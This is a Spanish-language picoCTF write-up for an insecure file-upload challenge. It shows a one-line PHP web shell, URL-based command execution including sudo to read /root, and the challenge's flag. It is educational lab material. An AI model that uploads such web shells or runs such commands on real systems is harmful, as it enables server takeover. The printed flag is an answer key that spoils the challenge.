## Descripción
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.You can access the web application [here](http://standard-pizzas.picoctf.net:54327/)!
## Pistas
File upload was not sanitized

Whenever you get a shell on a remote machine, check `sudo -l`
## Solución 1
Subiendo un archivo PHP que permita ejecutar comandos:
```php
<?php system($_GET['cmd']); ?>


picoCTF{wh47_c4n_u_d0_wPHP_f7424fc7}
```

Luego accediendo a la URL dando valor a cmd con el comando que queramos ejecutar

Para probar:

```
http://standard-pizzas.picoctf.net:54327/uploads/untitled.php?cmd=ls
```
Intentar usar el comando que viene en las pistas
```
http://standard-pizzas.picoctf.net:54327/uploads/untitled.php?cmd=sudo -l
```
Luego ver el directorio donde se encuentra la bandera
```
http://standard-pizzas.picoctf.net:54327/uploads/untitled.php?cmd=sudo%20ls%20/root
```
Finalmente leer el contenido del archivo `flag.txt`
```
http://standard-pizzas.picoctf.net:54327/uploads/untitled.php?cmd=sudo%20cat%20flag.txt
```

## Notas adicionales
Usar secuencias de escape en URLs como %20

## Referencias
https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload